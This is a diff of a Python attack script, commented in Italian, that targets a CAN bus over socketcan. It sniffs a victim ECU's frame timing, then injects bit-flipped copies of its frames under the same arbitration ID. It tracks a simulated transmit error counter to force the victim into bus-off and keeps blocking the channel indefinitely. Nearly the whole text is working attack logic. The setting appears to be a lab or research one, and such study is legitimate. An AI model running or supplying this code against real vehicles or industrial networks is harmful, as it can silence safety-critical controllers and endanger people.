@@ -22,7 +22,6 @@ def bitstring_to_bytes(bit_string):
     """Converte una stringa binaria in un array di byte."""
     data = bytearray()
     for i in range(0, len(bit_string), 8):
-        # Converte ogni sequenza di 8 bit in un intero (byte)
         data.append(int(bit_string[i:i+8], 2))
     return list(data)
 
@@ -40,7 +39,6 @@ def find_and_flip(data_bytes):
             break
             
     if flip_index == -1:
-        # Nessun bit Recessivo trovato (payload tutto a zero).
         return data_bytes, -1 
         
     modified_bit_string = "".join(modified_bit_string)
@@ -53,7 +51,7 @@ def find_and_flip(data_bytes):
 def start_attacker_dynamic_final_corrected():
     
     try:
-        # receive_own_messages=False è CRUCIALE
+        # received_own_messages=False è CRUCIALE per non ricevere le proprie eco
         bus = can.interface.Bus(channel=CAN_INTERFACE, interface='socketcan', receive_own_messages=False)
         print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")
     except OSError as e:
@@ -70,8 +68,10 @@ def start_attacker_dynamic_final_corrected():
     estimated_period = 0.0
     last_sniff_time = time.time()
 
+    # ==========================================================
     # --- FASE 1: STIMA SEQUENZIALE DELLA FREQUENZA (Sniffing) ---
-    # (Codice di sniffing invariato)
+    # ==========================================================
+    print("\n🔍 [Attaccante] FASE 1: Stima sequenziale della frequenza della Vittima...")
     
     while len(timestamps) < SAMPLE_SIZE + 1:
         msg = bus.recv(timeout=None) 
@@ -93,23 +93,28 @@ def start_attacker_dynamic_final_corrected():
     print(f"✅ [Attaccante] Stima completata. Periodo stimato (T): {estimated_period:.3f}s")
     if estimated_period < 0.01: estimated_period = 5.0
 
-    # --- FASE 2: ATTACCO CHIRURGICO REATTIVO ---
+    # ==========================================================
+    # --- FASE 2: ATTACCO CHIRURGICO REATTIVO (Sincronizzazione) ---
+    # ==========================================================
     print(f"\n--- FASE 2: Attacco avviato con T = {estimated_period:.3f}s ---")
     
     while True: # Loop infinito per la persistenza
         
         # 1. SINCRONIZZAZIONE (Attesa reattiva)
         time_to_next_msg = last_sniff_time + estimated_period - time.time()
+        
         if time_to_next_msg > 0:
-            time.sleep(time_to_next_msg - 0.005) # Aspetta fino a 5ms prima
+            # Aspetta fino a poco prima del messaggio atteso (5ms prima)
+            time.sleep(time_to_next_msg - 0.005) 
             
         # 2. RICEZIONE/SNIFFING DEL MESSAGGIO VITTIMA
         reference_msg = bus.recv(timeout=0.01) 
-        
+        current_time = time.time()
+
         if reference_msg is not None and reference_msg.arbitration_id == TARGET_ID:
-            last_sniff_time = time.time() 
+            last_sniff_time = current_time # Aggiorna il tempo base per il prossimo ciclo
             
-            # 3. LOGICA TEC SIMULATA E STAMPA (invariata)
+            # 3. LOGICA TEC SIMULATA E STAMPA
             if victim_tec_sim < BUS_OFF_THRESHOLD:
                 if victim_tec_sim < TEC_PASSIVE_THRESHOLD:
                     victim_tec_change, adversary_tec_change = 8, 8
@@ -128,13 +133,12 @@ def start_attacker_dynamic_final_corrected():
                     print("🚨🚨 [Attaccante] BUS OFF RILEVATO! Interrompo l'attacco.")
                     break
             else:
+                # VITTMA È IN BUS OFF TEORICO
                 print(f"\n--- CICLO PERSISTENTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                 print(f"🔥 [Persistenza] Vittima in Bus Off (TEC {victim_tec_sim}). Continuo a bloccare il canale...")
 
             
             # 4. MANIPOLAZIONE BIT CHIRURGICA
-            
-            # Eseguiamo la manipolazione sul payload sniffato
             modified_data, flip_index = find_and_flip(reference_msg.data)
             
             # 5. INIEZIONE DEL MESSAGGIO MALEVOLO MANIPOLATO
@@ -142,7 +146,7 @@ def start_attacker_dynamic_final_corrected():
                 try:
                     msg_attack = can.Message(
                         arbitration_id=TARGET_ID,
-                        data=modified_data, # Dati in formato byte (esadecimale)
+                        data=modified_data, 
                         is_extended_id=False
                     )
                     bus.send(msg_attack)
@@ -152,14 +156,14 @@ def start_attacker_dynamic_final_corrected():
                     print("⚠️ Errore CAN durante l'invio.")
                     pass 
             else:
-                 # Se non ci sono '1' da flippare, invia un frame di blocco generico per non perdere lo slot
+                 # Se non ci sono '1' da flippare, invia un frame di blocco generico
                  bus.send(can.Message(arbitration_id=TARGET_ID, data=[0x00]*8, is_extended_id=False))
                  print("⚠️ Impossibile flippare (payload tutto Dominante). Inviato frame di blocco generico.")
             
             attack_counter += 1
 
         else:
-            # Se la Vittima non trasmette nello slot atteso (es. si è fermata)
+            # Se la Vittima non trasmette nello slot atteso (jitter o Vittima ferma)
             if victim_tec_sim >= BUS_OFF_THRESHOLD:
                 # Continua la persistenza iniettando un frame di blocco generico
                 print(f"\n--- CICLO PERSISTENTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
